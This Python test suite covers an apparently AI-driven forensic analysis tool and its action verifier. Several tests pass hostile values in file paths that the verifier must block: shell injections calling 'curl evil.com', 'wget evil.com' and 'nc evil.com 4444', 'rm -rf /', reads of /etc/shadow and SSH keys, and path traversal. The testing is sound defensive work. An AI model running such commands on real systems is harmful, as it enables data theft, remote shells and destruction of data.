"""
Paladin 2.0 — Forensic Layer Integration Tests.
Tests all components without external dependencies (Neo4j, Docker, Ollama).
"""
import asyncio, json, sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

# ═══════════════════════════════════════════════════════════════════════════
# TEST 1: Action Verifier — Security Boundary #1
# ═══════════════════════════════════════════════════════════════════════════

def test_action_verifier():
    from paladin.forensic.action_verifier import (
        ForensicActionVerifier, VerifierCategory, VerifierDecision)

    v = ForensicActionVerifier()
    passed, failed = 0, 0

    def check(name, result, expected_cat, expected_dec):
        nonlocal passed, failed
        ok = result.category == expected_cat and result.decision == expected_dec
        icon = "✅" if ok else "❌"
        print(f"  {icon} {name}: {result.category.value} / {result.decision.value}")
        if not ok:
            print(f"     Expected: {expected_cat.value} / {expected_dec.value}")
            print(f"     Reason: {result.reason}")
            failed += 1
        else:
            passed += 1

    # SAFE: read-only functions targeting /evidence/
    check("get_file_metadata(/evidence/disk.img)",
          v.verify("get_file_metadata", {"path": "/evidence/disk.img"}),
          VerifierCategory.SAFE, VerifierDecision.APPROVED)

    check("compute_hash(/evidence/mem.raw)",
          v.verify("compute_hash", {"path": "/evidence/mem.raw", "algorithm": "sha256"}),
          VerifierCategory.SAFE, VerifierDecision.APPROVED)

    check("analyze_process_list",
          v.verify("analyze_process_list", {"memory_image": "/evidence/mem.raw"}),
          VerifierCategory.SAFE, VerifierDecision.APPROVED)

    check("scan_network_connections",
          v.verify("scan_network_connections", {"memory_image": "/evidence/mem.raw"}),
          VerifierCategory.SAFE, VerifierDecision.APPROVED)

    check("parse_mft",
          v.verify("parse_mft", {"image_path": "/evidence/disk.img"}),
          VerifierCategory.SAFE, VerifierDecision.APPROVED)

    check("extract_strings",
          v.verify("extract_strings", {"path": "/evidence/file.exe"}),
          VerifierCategory.SAFE, VerifierDecision.APPROVED)

    # FORBIDDEN: shell injection
    check("shell_injection_semicolon",
          v.verify("get_file_metadata", {"path": "/evidence/a; rm -rf /"}),
          VerifierCategory.FORBIDDEN, VerifierDecision.BLOCKED)

    check("shell_injection_pipe",
          v.verify("compute_hash", {"path": "/evidence/a | cat /etc/passwd"}),
          VerifierCategory.FORBIDDEN, VerifierDecision.BLOCKED)

    check("shell_injection_backtick",
          v.verify("get_file_metadata", {"path": "/evidence/`whoami`"}),
          VerifierCategory.FORBIDDEN, VerifierDecision.BLOCKED)

    check("shell_injection_dollar",
          v.verify("extract_strings", {"path": "/evidence/$(cat /etc/shadow)"}),
          VerifierCategory.FORBIDDEN, VerifierDecision.BLOCKED)

    check("shell_injection_eval",
          v.verify("get_file_metadata", {"path": "/evidence/eval something"}),
          VerifierCategory.FORBIDDEN, VerifierDecision.BLOCKED)

    # FORBIDDEN: path traversal
    check("path_traversal_dotdot",
          v.verify("get_file_metadata", {"path": "/evidence/../../../etc/passwd"}),
          VerifierCategory.FORBIDDEN, VerifierDecision.BLOCKED)

    check("path_traversal_encoded",
          v.verify("compute_hash", {"path": "/evidence/..%2F..%2Fetc/shadow"}),
          VerifierCategory.FORBIDDEN, VerifierDecision.BLOCKED)

    # FORBIDDEN: path outside boundaries
    check("path_outside_boundary",
          v.verify("get_file_metadata", {"path": "/etc/passwd"}),
          VerifierCategory.FORBIDDEN, VerifierDecision.BLOCKED)

    check("path_root",
          v.verify("compute_hash", {"path": "/root/.ssh/id_rsa"}),
          VerifierCategory.FORBIDDEN, VerifierDecision.BLOCKED)

    # FORBIDDEN: unknown function
    check("unknown_function",
          v.verify("delete_all_files", {"path": "/evidence/x"}),
          VerifierCategory.FORBIDDEN, VerifierDecision.BLOCKED)

    check("rm_function",
          v.verify("rm", {"path": "/evidence/x"}),
          VerifierCategory.FORBIDDEN, VerifierDecision.BLOCKED)

    print(f"\n  Stats: {v.stats}")
    return passed, failed


# ═══════════════════════════════════════════════════════════════════════════
# TEST 2: MCP Types — Pydantic Models
# ═══════════════════════════════════════════════════════════════════════════

def test_mcp_types():
    from paladin.forensic.mcp_types import (
        FileMetadata, HashResult, ProcessInfo, ProcessList,
        NetworkConnection, ConnectionList, MCPRequest, MCPResponse,
        MFTEntry, MFTResult, PrefetchEntry, StringsList, SuspiciousPattern)

    passed, failed = 0, 0

    def check(name, fn):
        nonlocal passed, failed
        try:
            fn()
            print(f"  ✅ {name}")
            passed += 1
        except Exception as e:
            print(f"  ❌ {name}: {e}")
            failed += 1

    check("FileMetadata create", lambda: FileMetadata(
        name="disk.img", size=1073741824, mime_type="application/octet-stream"))

    check("HashResult create", lambda: HashResult(
        path="/evidence/x", algorithm="sha256",
        hash_value="e3b0c44298fc1c149afbf4c8996fb924", file_size=1024))

    check("ProcessList with suspicious", lambda: ProcessList(
        processes=[ProcessInfo(pid=1, name="init", ppid=0)],
        suspicious_processes=[ProcessInfo(pid=666, name="mimikatz.exe", ppid=1)],
        total_count=2))

    check("ConnectionList external", lambda: ConnectionList(
        connections=[NetworkConnection(
            local_addr="10.0.0.1:443", remote_addr="185.141.63.10:8080",
            state="ESTABLISHED", pid=4444, process_name="svchost.exe")],
        total_count=1))

    check("MCPRequest envelope", lambda: MCPRequest(
        function="analyze_process_list",
        parameters={"memory_image": "/evidence/mem.raw"},
        incident_id="INC-001", plan_id="FP-001"))

    check("MCPResponse success", lambda: MCPResponse(
        function="compute_hash", success=True,
        result={"hash_value": "abc123"}, execution_time_ms=150))

    check("MCPResponse error", lambda: MCPResponse(
        function="unknown", success=False, error="Not found"))

    check("MFTResult timeline", lambda: MFTResult(
        entry_count=3, timeline=[
            MFTEntry(timestamp="2026-01-15T10:00:00", action="CREATED",
                     path="C:\\Windows\\Temp\\evil.exe", size=45056)]))

    check("StringsList with IOCs", lambda: StringsList(
        strings=["http://evil.com/payload", "192.168.1.1"],
        total_count=2,
        suspicious_patterns=[
            SuspiciousPattern(pattern="http://evil.com/payload", category="url")]))

    check("Serialization roundtrip", lambda: (
        json.loads(MCPResponse(
            function="test", success=True,
            result={"key": "value"}).model_dump_json())))

    return passed, failed


# ═══════════════════════════════════════════════════════════════════════════
# TEST 3: MCP Server — Function Registry
# ═══════════════════════════════════════════════════════════════════════════

def test_mcp_server_registry():
    from paladin.forensic.action_verifier import ForensicActionVerifier
    from paladin.forensic.sandbox_manager import SandboxManager
    from paladin.forensic.mcp_server import SIFTMCPServer
    from paladin.forensic.mcp_types import MCPRequest

    v = ForensicActionVerifier()
    s = SandboxManager()
    server = SIFTMCPServer(s, v)

    passed, failed = 0, 0

    # Check all expected functions are registered
    expected = [
        "get_file_metadata", "compute_hash", "extract_strings",
        "analyze_process_list", "scan_network_connections",
        "extract_loaded_modules", "parse_mft", "parse_prefetch",
        "extract_registry_hive", "parse_pcap", "extract_browser_artifacts"]

    available = server.get_available_functions()
    for fn in expected:
        ok = fn in available
        icon = "✅" if ok else "❌"
        print(f"  {icon} Function registered: {fn}")
        if ok: passed += 1
        else: failed += 1

    # Test unknown function rejection
    async def test_unknown():
        nonlocal passed, failed
        req = MCPRequest(function="rm_rf_everything", parameters={})
        resp = await server.execute(req, "fake-container")
        ok = not resp.success and "Unknown" in (resp.error or "")
        icon = "✅" if ok else "❌"
        print(f"  {icon} Unknown function rejected: {resp.error[:50] if resp.error else 'N/A'}")
        if ok: passed += 1
        else: failed += 1

    asyncio.run(test_unknown())

    # Test forbidden path rejection
    async def test_forbidden():
        nonlocal passed, failed
        req = MCPRequest(function="get_file_metadata",
                         parameters={"path": "/etc/shadow"})
        resp = await server.execute(req, "fake-container")
        ok = not resp.success and "BLOCKED" in (resp.error or "")
        icon = "✅" if ok else "❌"
        print(f"  {icon} Forbidden path blocked: {resp.error[:60] if resp.error else 'N/A'}")
        if ok: passed += 1
        else: failed += 1

    asyncio.run(test_forbidden())

    return passed, failed


# ═══════════════════════════════════════════════════════════════════════════
# TEST 4: Correlation Engine — Source Classification & Entity Extraction
# ═══════════════════════════════════════════════════════════════════════════

def test_correlation_engine():
    from paladin.forensic.correlation_engine import CorrelationEngine

    passed, failed = 0, 0

    # Source classification
    cases = {
        "analyze_process_list": "memory",
        "scan_network_connections": "memory",
        "extract_loaded_modules": "memory",
        "parse_mft": "disk",
        "extract_strings": "disk",
        "compute_hash": "disk",
        "extract_registry_hive": "disk",
        "parse_pcap": "network",
        "extract_browser_artifacts": "network",
    }
    for tool, expected_src in cases.items():
        result = CorrelationEngine._classify_source(tool)
        ok = result == expected_src
        icon = "✅" if ok else "❌"
        if ok: passed += 1
        else: failed += 1
        if not ok:
            print(f"  {icon} {tool} → {result} (expected {expected_src})")

    if all(CorrelationEngine._classify_source(t) == e for t, e in cases.items()):
        print(f"  ✅ All {len(cases)} source classifications correct")

    # Entity extraction
    text = "Found svchost.exe connecting to 185.141.63.10 and cmd.exe"
    procs = CorrelationEngine._extract_process_names(text)
    ips = CorrelationEngine._extract_ips(text)

    ok_procs = "svchost.exe" in procs and "cmd.exe" in procs
    ok_ips = "185.141.63.10" in ips
    print(f"  {'✅' if ok_procs else '❌'} Process extraction: {procs}")
    print(f"  {'✅' if ok_ips else '❌'} IP extraction: {ips}")
    passed += (1 if ok_procs else 0) + (1 if ok_ips else 0)
    failed += (0 if ok_procs else 1) + (0 if ok_ips else 1)

    # Private IP check
    private_cases = {"10.0.0.1": True, "192.168.1.1": True,
                     "8.8.8.8": False, "185.141.63.10": False}
    all_ok = all(CorrelationEngine._is_private_ip(ip) == exp
                 for ip, exp in private_cases.items())
    print(f"  {'✅' if all_ok else '❌'} Private IP classification: {len(private_cases)} cases")
    if all_ok: passed += 1
    else: failed += 1

    return passed, failed


# ═══════════════════════════════════════════════════════════════════════════
# TEST 5: ForensicPlanManager — JSON Parsing
# ═══════════════════════════════════════════════════════════════════════════

def test_plan_manager_parsing():
    from paladin.forensic.plan_manager import ForensicPlanManager

    passed, failed = 0, 0

    # Test JSON extraction from LLM responses
    cases = [
        ("plain JSON", '{"working_plan": "test", "todo_items": []}',
         "test", 0),
        ("markdown fenced", '```json\n{"working_plan": "fenced", "todo_items": [{"order":1}]}\n```',
         "fenced", 1),
        ("with preamble", 'Here is my plan:\n```json\n{"working_plan": "preamble", "todo_items": []}\n```\nDone.',
         "preamble", 0),
        ("double fenced", '```\n{"working_plan": "double", "todo_items": [{"order":1},{"order":2}]}\n```',
         "double", 2),
    ]

    for name, response, expected_plan, expected_items in cases:
        result = ForensicPlanManager._parse_json_response(response)
        ok = (result.get("working_plan") == expected_plan and
              len(result.get("todo_items", [])) == expected_items)
        icon = "✅" if ok else "❌"
        print(f"  {icon} Parse '{name}': plan='{result.get('working_plan', '?')[:30]}', "
              f"items={len(result.get('todo_items', []))}")
        if ok: passed += 1
        else: failed += 1

    # Graceful fallback on invalid JSON
    result = ForensicPlanManager._parse_json_response("This is not JSON at all")
    ok = isinstance(result, dict) and "working_plan" in result
    print(f"  {'✅' if ok else '❌'} Graceful fallback on invalid JSON")
    if ok: passed += 1
    else: failed += 1

    return passed, failed


# ═══════════════════════════════════════════════════════════════════════════
# TEST 6: Forensic Prompts — Template Building
# ═══════════════════════════════════════════════════════════════════════════

def test_prompts():
    from paladin.forensic.prompts import (
        build_planning_prompt, build_execution_prompt,
        build_self_check_prompt, format_plan_for_prompt)

    passed, failed = 0, 0

    # Planning prompt
    sys_p, usr_p = build_planning_prompt(
        "INC-001", "Suspicious Process", "HIGH", 0.85,
        "Detected cmd.exe spawning from svchost.exe",
        "/evidence/mem.raw\n/evidence/disk.img")
    ok = "INC-001" in usr_p and "SIFT MCP" in sys_p and "analyze_process_list" in sys_p
    print(f"  {'✅' if ok else '❌'} Planning prompt contains incident + tools")
    if ok: passed += 1
    else: failed += 1

    # Execution prompt
    sys_e, usr_e = build_execution_prompt(
        "Plan context here", 3, "Analyze MFT", "parse_mft",
        '{"entry_count": 150, "anomalies": []}')
    ok = "Step 3" in usr_e and "parse_mft" in usr_e and "CONTINUE" in sys_e
    print(f"  {'✅' if ok else '❌'} Execution prompt contains step + output")
    if ok: passed += 1
    else: failed += 1

    # Self-check prompt
    sys_c, usr_c = build_self_check_prompt(
        "F-001", "Found evil.exe in memory", "analyze_process_list",
        85, "evil.exe PID 4444",
        [{"finding_id": "F-000", "description": "No evil.exe on disk",
          "tool_used": "parse_mft", "confidence": 90}])
    ok = "F-001" in usr_c and "F-000" in usr_c and "contradiction" in sys_c.lower()
    print(f"  {'✅' if ok else '❌'} Self-check prompt contains both findings")
    if ok: passed += 1
    else: failed += 1

    # Format plan
    plan_str = format_plan_for_prompt({
        "plan_id": "FP-001", "status": "IN_PROGRESS",
        "iteration_count": 1, "max_iterations": 5,
        "working_plan": "Investigate suspicious activity",
        "todo_items": [
            {"order_index": 1, "description": "Check processes",
             "status": "DONE", "result_summary": "Found evil.exe"},
            {"order_index": 2, "description": "Check disk",
             "status": "PENDING"},
        ],
        "findings": [
            {"finding_id": "F-001", "description": "Evil process found",
             "verified": True, "confidence": 90}]})
    ok = "FP-001" in plan_str and "✅" in plan_str and "⬜" in plan_str
    print(f"  {'✅' if ok else '❌'} Plan formatting with status icons")
    if ok: passed += 1
    else: failed += 1

    # Truncation test
    long_output = "x" * 10000
    _, usr = build_execution_prompt("ctx", 1, "step", "tool", long_output)
    ok = len(usr) < 6000 and "truncated" in usr
    print(f"  {'✅' if ok else '❌'} Long output truncated ({len(usr)} chars)")
    if ok: passed += 1
    else: failed += 1

    return passed, failed


# ═══════════════════════════════════════════════════════════════════════════
# TEST 7: End-to-End Security Boundary Stress Test
# ═══════════════════════════════════════════════════════════════════════════

def test_security_stress():
    from paladin.forensic.action_verifier import ForensicActionVerifier, VerifierCategory

    v = ForensicActionVerifier()
    passed, failed = 0, 0

    # 20 attack vectors that MUST be blocked
    attacks = [
        ("get_file_metadata", {"path": "/evidence/a; rm -rf /"}),
        ("compute_hash", {"path": "/evidence/x && cat /etc/shadow"}),
        ("extract_strings", {"path": "/evidence/$(curl evil.com)"}),
        ("get_file_metadata", {"path": "/evidence/`id`"}),
        ("compute_hash", {"path": "/evidence/a || wget evil.com"}),
        ("get_file_metadata", {"path": "/evidence/../../../etc/passwd"}),
        ("compute_hash", {"path": "/evidence/..%2F..%2Froot/.ssh"}),
        ("get_file_metadata", {"path": "/etc/shadow"}),
        ("compute_hash", {"path": "/root/.bashrc"}),
        ("get_file_metadata", {"path": "/var/log/auth.log"}),
        ("delete_file", {"path": "/evidence/x"}),
        ("write_file", {"path": "/evidence/x", "content": "pwned"}),
        ("execute_shell", {"command": "id"}),
        ("chmod", {"path": "/evidence/x", "mode": "777"}),
        ("dd", {"if": "/dev/sda", "of": "/evidence/dump"}),
        ("get_file_metadata", {"path": "/evidence/eval test"}),
        ("get_file_metadata", {"path": "/evidence/a | nc evil.com 4444"}),
        ("compute_hash", {"path": "/evidence/python -c 'import os'"}),
        ("extract_strings", {"path": "/evidence/bash -i"}),
        ("get_file_metadata", {"path": "/evidence/source /etc/profile"}),
    ]

    blocked = 0
    for func, params in attacks:
        result = v.verify(func, params)
        if result.category == VerifierCategory.FORBIDDEN:
            blocked += 1
        else:
            print(f"  ❌ NOT BLOCKED: {func}({params})")
            failed += 1

    ok = blocked == len(attacks)
    print(f"  {'✅' if ok else '❌'} Security stress: {blocked}/{len(attacks)} attacks blocked")
    if ok: passed += 1
    else: failed += 1

    return passed, failed


# ═══════════════════════════════════════════════════════════════════════════
# RUNNER
# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("=" * 70)
    print("  🛡️  PALADIN 2.0 — Forensic Layer Test Suite")
    print("=" * 70)

    total_passed, total_failed = 0, 0
    tests = [
        ("Action Verifier (Security Boundary #1)", test_action_verifier),
        ("MCP Types (Pydantic Models)", test_mcp_types),
        ("MCP Server (Function Registry)", test_mcp_server_registry),
        ("Correlation Engine (Source Classification)", test_correlation_engine),
        ("ForensicPlanManager (JSON Parsing)", test_plan_manager_parsing),
        ("Forensic Prompts (Template Building)", test_prompts),
        ("Security Boundary Stress Test (20 attacks)", test_security_stress),
    ]

    for name, test_fn in tests:
        print(f"\n{'─' * 60}")
        print(f"  TEST: {name}")
        print(f"{'─' * 60}")
        try:
            p, f = test_fn()
            total_passed += p
            total_failed += f
        except Exception as e:
            print(f"  💥 CRASH: {e}")
            import traceback
            traceback.print_exc()
            total_failed += 1

    print(f"\n{'═' * 70}")
    verdict = "ALL PASSED ✅" if total_failed == 0 else f"FAILURES: {total_failed} ❌"
    print(f"  TOTAL: {total_passed} passed, {total_failed} failed — {verdict}")
    print(f"{'═' * 70}")
    sys.exit(1 if total_failed else 0)
